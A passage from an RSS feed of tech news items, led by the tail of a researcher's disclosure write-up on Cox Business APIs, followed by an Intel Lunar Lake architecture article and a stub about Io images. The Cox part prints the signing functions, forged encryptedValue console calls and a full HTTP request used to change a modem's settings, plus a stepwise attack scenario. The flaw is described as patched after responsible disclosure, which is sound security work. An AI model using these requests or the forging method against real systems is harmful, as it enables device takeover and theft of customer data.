    <span>"status":</span> <span>"ACTIVE"</span>,
    <span>"ownerEmail":</span> <span>"admin@cox.net"</span>
  },
  <span>"contactType":</span> {
    <span>"contactInfo":</span> [
      {
        <span>"type":</span> <span>"alternateEmail"</span>,
        <span>"value":</span> <span>"redacted@redacted.com"</span>
      }
    ]
  },
  <span>"preferredEmail":</span> <span>"admin@cox.net"</span>
}
</code></pre>
<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>
<h3 id="overwriting-anyones-device-settings-via-leaked-cryptographic-secret">Overwriting Anyone's Device Settings via Leaked Cryptographic Secret</h3>
<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code>encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code>encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>
<figure><img alt="JS" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75"><figcaption>JS</figcaption></figure>
<p>After tracing the <code>encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code><span>encryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> k = n.<span>AES</span>.<span>encrypt</span>(D, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>ciphertext</span>.<span>toString</span>(n.<span>enc</span>.<span>Base64</span>);
    <span>return</span> <span>btoa</span>(s.<span>IV</span> + <span>"::"</span> + s.<span>qs</span> + <span>"::"</span> + k)
}
</code></pre>
<pre><code><span>decryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> W = <span>atob</span>(D),
        k = <span>this</span>.<span>sanitize</span>(W.<span>split</span>(<span>"::"</span>)[<span>2</span>]),
        M = n.<span>lib</span>.<span>CipherParams</span>.<span>create</span>({
            <span>ciphertext</span>: n.<span>enc</span>.<span>Base64</span>.<span>parse</span>(k)
        });
    <span>return</span> n.<span>AES</span>.<span>decrypt</span>(M, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>toString</span>(n.<span>enc</span>.<span>Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>I set a breakpoint at exactly where the <code>encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0="</span>)
<span>"8042"</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code>encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09"</span>)
<span>541051614702</span>;<span>DTC4131</span>;<span>333415591</span>;<span>1</span>;<span>f4</span>:<span>c1</span>:<span>14</span>:<span>70</span>:4<span>d</span>:ac;<span>Internet</span>
</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code><span>541051614702</span> <span>=</span> <span>Cox</span> <span>Account</span> <span>Number</span>
<span>DTC4131</span> <span>=</span> <span>Device</span> <span>Name</span>
<span>333415592</span> <span>=</span> <span>Device</span> <span>ID</span>
<span>1</span> <span>=</span> <span>Unknown</span>
<span>f4:c1:14:70:4d:ac</span> <span>=</span> <span>MAC</span> <span>address</span>
<span>Internet</span> <span>=</span> <span>Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code>123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code>t.<span>cbHelper</span>.<span>encryptWithSaltandPadding</span>(<span>"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING"</span>)
<span>OGEzMjNmNjFhOTk</span>2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09
</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>
<pre><code><span>POST</span> <span>/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:123.0)</span> <span>Gecko/20100101</span> <span>Firefox/123.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>56583255</span><span>-1cf3-41aa-9600-3d5585152e87</span>
<span>Connection:</span> <span>close</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>431</span>

{
  <span>"wifiSettings":</span> {
    <span>"customerWifiSsid24":</span> <span>"Curry"</span>
  },
  <span>"additionalProperties":</span> {
    <span>"customerWifiSsid24":</span> [
      <span>"Curry"</span>
    ]
  },
  <span>"encryptedValue":</span> <span>"T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ=="</span>
}
</code></pre>
<pre><code>HTTP/<span>1.1</span> <span>200</span> OK
Server<span>:</span> nginx

<span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span>
<span>}</span>
</code></pre>
<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would've looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>03/04/2024 - Vulnerability reported to Cox via their <a href="https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html">responsible disclosure program</a></li>
<li>03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function</li>
<li>03/06/2024 - Email Cox that I can no longer reproduce the vulnerability</li>
<li>03/07/2024 - Cox writes that they are beginning a comprehensive security review</li>
<li>04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure</li>
<li>04/29/2024 - Shared link to blog post draft with Cox</li>
</ul>
<h2 id="thanks">Thanks</h2>
<ul>
<li>Thanks to <a href="https://twitter.com/blastbots">@blastbots</a> for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!</li>
<li>Thanks to <a href="https://twitter.com/sshell_">Justin Rhinehart</a> and <a href="https://twitter.com/birchb0y">Alden</a> for working closely with me for the investigation process, providing tons of help doing OSINT stuff.</li>
<li>Thanks to <a href="https://twitter.com/galnagli">Gal Nagli</a>, <a href="https://twitter.com/bbuerhaus">Brett Buerhaus</a>, <a href="https://twitter.com/avlidienbrunn">Mathias Karlsson</a>, <a href="https://twitter.com/d0nutptr">Nathanial Lattimer</a>, <a href="https://twitter.com/xEHLE_">Maik Robert</a>, <a href="https://twitter.com/infosec_au">Shubham Shah</a>, <a href="https://twitter.com/0xteknogeek">Joel Margolis</a>, <a href="https://twitter.com/Rhynorater">Justin Gardner</a>, Daley Borda, <a href="https://twitter.com/umasiii">William Tom</a>, and Ebrietas for reviewing the draft version of this blog post.</li>
<li>Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.</li>
</ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel Unveils Lunar Lake Architecture (135 pts)]]></title>
            <link>https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</link>
            <guid>40570356</guid>
            <pubDate>Tue, 04 Jun 2024 03:17:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4">https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</a>, See on <a href="https://news.ycombinator.com/item?id=40570356">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

                

<div>
    <nav>
        <ul>
            <li><a href="https://www.anandtech.com/">Home</a><span>&gt;</span></li>
                <li><a href="https://www.anandtech.com/tag/socs">SoCs</a></li>
        </ul>
        
    </nav>

    
    
</div>





    
    

<div>

                <p><img src="https://images.anandtech.com/doci/21425/LL_Car3_678x452.jpg" alt="">
                </p>

            


        <div>
            <p>Intel this morning is lifting the lid on&nbsp;some of the finer architectural and technical details about its upcoming Lunar Lake SoC – the chip that will be the next generation of Core Ultra mobile processors. Once again holding one of their increasingly regular Tech Tour events for media and analysts, Intel this time set up shop in Taipei just before the beginning of Computex 2024. During the Tech Tour, Intel disclosed numerous facets of Lunar Lake, including their new P-Core design codenamed <em>Lion Cove</em> and a new wave of E-cores that are a bit more like Meteor Lake's pioneering Low Power Island E-Cores. Also disclosed was the Intel NPU 4, which Intel claims delivers up to 48 TOPS, surpassing&nbsp;Microsoft's Copilot+ requirements for the new age of AI PCs.</p>

<p>Intel's Lunar Lake represents a strategic evolution in their mobile SoC lineup, building on their Meteor Lake launch last year, focusing&nbsp;on&nbsp;enhancing power efficiency and optimizing performance across the board. Lunar Lake dynamically allocates tasks to efficient cores (E-cores) or performance cores (P-cores) based on workload demands by leveraging advanced scheduling mechanisms, which are assigned to ensure optimal power usage and performance. Still, once again, Intel Thread Director, along with Windows 11, plays a pivotal role in this process, guiding the OS scheduler to make real-time adjustments that balance efficiency with computational power depending on the intensity of the workload.</p>

<table>
	<tbody>
		<tr>
			<td colspan="6">Intel CPU Architecture Generations</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td>Alder/Raptor Lake</td>
			<td>Meteor<br>
			Lake</td>
			<td><b>Lunar<br>
			Lake</b></td>
			<td>Arrow<br>
			Lake</td>
			<td>Panther<br>
			Lake</td>
		</tr>
		<tr>
			<td>P-Core Architecture</td>
			<td>Golden Cove/<br>
			Raptor Cove</td>
			<td>Redwood Cove</td>
			<td><strong>Lion Cove</strong></td>
			<td>Lion Cove</td>
			<td>Cougar Cove?</td>
		</tr>
		<tr>
			<td>E-Core Architecture</td>
			<td>Gracemont</td>
			<td>Crestmont</td>
			<td><strong>Skymont</strong></td>
			<td>Crestmont?</td>
			<td>Darkmont?</td>
		</tr>
		<tr>
			<td>GPU Architecture</td>
			<td>Xe-LP</td>
			<td>Xe-LPG</td>
			<td><strong>Xe2</strong></td>
			<td>Xe2?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>NPU Architecture</td>
			<td>N/A</td>
			<td>NPU 3720</td>
			<td><strong>NPU 4</strong></td>
			<td>?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Active Tiles</td>
			<td>1 (Monolithic)</td>
			<td>4</td>
			<td><strong>2</strong></td>
			<td>4?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Manufacturing Processes</td>
			<td>Intel 7</td>
			<td>Intel 4 + TSMC N6 + TSMC N5</td>
			<td><strong>TSMC N3B + TSMC N6</strong></td>
			<td>Intel 20A + More</td>
			<td>Intel 18A</td>
		</tr>
		<tr>
			<td>Segment</td>
			<td>Mobile + Desktop</td>
			<td>Mobile</td>
			<td><strong>LP Mobile</strong></td>
			<td>HP Mobile + Desktop</td>
			<td>Mobile?</td>
		</tr>
		<tr>
			<td>Release Date (OEM)</td>
			<td>Q4'2021</td>
			<td>Q4'2023</td>
			<td><strong>Q3'2024</strong></td>
			<td>Q4'2024</td>
			<td>2025</td>
		</tr>
	</tbody>
</table>

<h3>Lunar Lake: Designed By Intel, Built By TSMC (&amp; Assembled By Intel)</h3>

<p>While there are many aspects of Lunar Lake to dive into, perhaps it's best we start with what's sure to be the most eye-catching: who's building it.</p>

<p>Intel's Lunar Lake tiles are not being fabbed using any of their own foundry facilities – a sharp departure from historical precedence, and even the recent Meteor Lake, where the compute tile was made using the Intel 4 process. Instead, both tiles of the disaggregated Lunar Lake are being fabbed over at TSMC, using a mix of TSMC's N3B and N6 processes. In 2021 Intel set about freeing their chip design groups to use the best foundry they could – be it internal or external – and there's no place that's more apparent than here.</p>

<p>Overall, Lunar Lake represents their second generation of disaggregated SoC architecture for the mobile market, replacing the Meteor Lake architecture in the lower-end space.&nbsp;At this time, Intel has disclosed that it uses a 4P+4E (8 core) design, with hyper-threading/SMT disabled, so the total thread count supported by the processor is simply the number of CPU cores, e.g., 4P+4E/8T.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"></a></p>

<p>The build-up of Lunar Lake combines a synergetic collaboration between Intel’s architectural design team and TSMC's manufacturing process nodes to bring the latest Lion Cove P-cores to Lunar Lake, which boosts Intel's architectural IPC as you would expect from a new generation. At the same time, Intel also&nbsp;introduces the Skymont E-cores, which replace the Low Power Island Cresmont E-cores of Meteor Lake. Notably, however, these E-cores don't connect to the ring bus like the P-cores, which makes them a sort of hybrid LP E-core, combining the efficiency gains of the more advanced TSMC N3B node with the double-digit gains in IPC over the previous Crestmont cores.</p>

<p>The entire compute tile, including the P and E-cores, is built on TSMC's N3B node, while the SoC tile is made using the TSMC N6 node.</p>

<p>At a higher level, Intel is once again using their Foveros packaging technology here. Both the compute and SoC (now the "Platform Controller") tiles sit on top of a base tile, which provides high-speed/low-power routing between the tiles, and further connectivity to the rest of the chip and beyond.</p>

<p>In another first for a mainstream Intel Core product, the Lunar Lake SoC platform also&nbsp;includes up to 32 GB of LPDDR5X memory on the chip package itself. This is arranged as a pair of 64-bit memory chips, offering a total 128-bit memory interface. As with other vendors using on-package memory, this change means that users can't just upgrade DRAM at-will, and the memory configurations for Lunar Lake will ultimately be determined by what SKUs Intel opts to ship.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"></a></p>

<p>With Lunar Lake, Intel is also strongly focusing on AI, as the architecture integrates a new NPU called NPU 4. This NPU is rated for up to 48 TOPS of INT8 performance, thus making it Microsoft Copilot+ AI PC ready. This is the bar all of the PC SoC vendors are aiming for, including AMD and Qualcomm too.</p>

<p>Intel's integrated GPU will also be a contributing player here. While not the highly efficient machine that the dedicated NPU is, the Arc Xe2-LPG brings dozens of additional T(FL)OPS of performance with it, and some additional flexibility an NPU doesn't come with. Which is why you'll also see Intel rating the performance of these chips in terms of total platform TOPS – in this case, 120 TOPS.</p>

<p>Intel's collaboration with Microsoft further enhances workload management through the fabled Intel Thread Director, optimized for applications such as the Copilot assistant. Given the time of the introduction of Lunar Lake, it somewhat sets the stage for a Q3 2024 launch, which coincides with the&nbsp;holiday 2024 market.</p>

<h3>Intel Lunar Lake: Updating Intel Thread Director &amp; Power Management Improvements</h3>

<p>To say that energy efficiency is a key goal for Lunar Lake would be an understatement. For as much as Intel is riding high in the mobile PC CPU market (AMD's share there is still but a fraction), the company has been feeling the pressure over the last few years from customer-turned-rival Apple, whose M-series Apple Silicon has been setting the bar for power efficiency over the last few years. And now with Qualcomm attempting to do the same things for the Windows ecosystem with their forthcoming Snapdragon X chips, Intel is preparing to make their own power play.</p>

<p>Intel's Thread Director and power management updates for Lunar Lake show various and significant improvements compared to Meteor Lake. The Thread Director uses a heterogeneous scheduling policy, initially assigning tasks to a single E-core and expanding to other E-cores or P-cores as and when needed. OS containment zones are designed to limit tasks to specific cores, which directly improves power efficiency and delivers the performance needed by the right core for the workload at hand.&nbsp;Integration with power management systems and a quad array of Power Management Controllers (PMC) further allows the chip, in concert with Windows 11, to make context-aware adjustments, ensuring optimal performance with minimal power usage and wastage.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"></a></p>

<p>Lunar Lake's scheduling strategy effectively handles power-sensitive applications. One example Intel gave is that&nbsp;video conferencing tasks are kept within the efficiency core cluster, utilizing the E-cores to maintain performance while reducing power consumption by up to 35%, as shown by Intel's provided data. These improvements are achieved through collaboration with OS developers such as Microsoft for seamless integration for optimizing for the best balance between power consumption and performance.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"></a></p>

<p>Focusing on the power management system for Lunar Lake, Intel uses its SoC power management, operating in efficiency, balance, and performance modes tailored and designed to adapt to whatever the demands of the workload at the time of operation. This multi-layered approach allows the Lunar Lake SoC to operate efficiently. Again,&nbsp;much like the Intel&nbsp;Thread Director, the PMCs can&nbsp;balance power usage with performance needs.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"></a></p>

<p>Intel further plans to enhance the Thread Director by increasing scenario granularity, implementing AI-based scheduling hints, and enabling cross-IP scheduling within Windows 11. These enhancements essentially equate to workload management designed to boost overall power efficiency and deliver performance across various applications when needed without wasting power budget by allocating lighter tasks to the higher power P-cores.</p>

<p>Over the next few pages, we'll explore the new P and E cores and Intel's update to ther integrated Arc Xe (Xe2-LPG) graphics.</p>

        </div>
        <p><a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4/2">Intel Lunar Lake: New P-Core, Enter Lion Cove</a>

                
        </p>
            
            
            
            
            


</div>

    



            </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel's Lion Cove Architecture Preview (152 pts)]]></title>
            <link>https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</link>
            <guid>40570326</guid>
            <pubDate>Tue, 04 Jun 2024 03:11:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/">https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</a>, See on <a href="https://news.ycombinator.com/item?id=40570326">Hacker News</a></p>
Couldn't get https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[New telescope images of Jupiter's moon Io rival those from spacecraft (165 pts)]]></title>
            <link>https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</link>
            <guid>40569949</guid>
            <pubDate>Tue, 04 Jun 2024 01:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html">https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</a>, See on <a href="https://news.ycombinator.com/item?id=40569949">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
